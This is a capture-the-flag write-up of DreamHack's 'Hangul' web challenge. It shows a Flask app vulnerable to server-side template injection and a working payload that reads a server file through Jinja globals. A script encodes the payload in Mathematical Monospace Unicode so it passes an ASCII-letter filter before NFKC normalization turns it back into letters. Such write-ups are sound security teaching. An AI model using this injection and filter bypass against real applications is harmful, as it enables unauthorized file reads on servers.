# Hangul — DreamHack

> **Room / Challenge:** Hangul (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Hangul (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1847`
- **Level:** `2`
- **Date:** `21-11-2025`

---

## Goal

Leveraging SSTI and bypassing the check of ASCII texts to get the flag.

## My Solution

The `app.py` is simple:

```python
from flask import Flask, request, render_template_string
import re
import unicodedata

app = Flask(__name__)

# 페이지에서 사용자 입력을 출력하는 부분
@app.route("/", methods=["GET", "POST"])
def index():
    message = ""
    if request.method == "POST":
        message = request.form["message"]
        if re.search("[a-zA-Z]", message):
            message = "한글을 사용합시다!"
        message = unicodedata.normalize("NFKC", message)    # for normalize Windows and Mac Hangul implementation
    return render_template_string('''
        <form method="POST">
            Message: <input type="text" name="message">
            <input type="submit">
        </form>
        <p>Repeat your message:</p>
        <div>%s</div>
    ''' % message)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

The app will check our input then render it out in the UI, it checks for ASCII characters:

```python
message = request.form["message"]
if re.search("[a-zA-Z]", message):
    message = "한글을 사용합시다!"
message = unicodedata.normalize("NFKC", message)
```

The vulnerable code here is:

```python
message = unicodedata.normalize("NFKC", message)
```

Where we can use SSTI, our target payload:

```python
{{ lipsum.__globals__.__builtins__.open("/home/hangul/flag").read() }}
```

We will convert these normal characters to Mathematical Monospace Unicode characters that can bypass the check of ASCII characters, but the server still understands it:

```python
import unicodedata

def to_mono(text):
    result = ""
    for char in text:
        code = ord(char)

        if 97 <= code <= 122:
            result += chr(0x1D68A + (code - 97))
        elif 65 <= code <= 90:
            result += chr(0x1D670 + (code - 65))
        else:
            result += char

    return result

raw_payload = '{{ lipsum.__globals__.__builtins__.open("/home/hangul/flag").read() }}'
encoded_payload = to_mono(raw_payload)
```
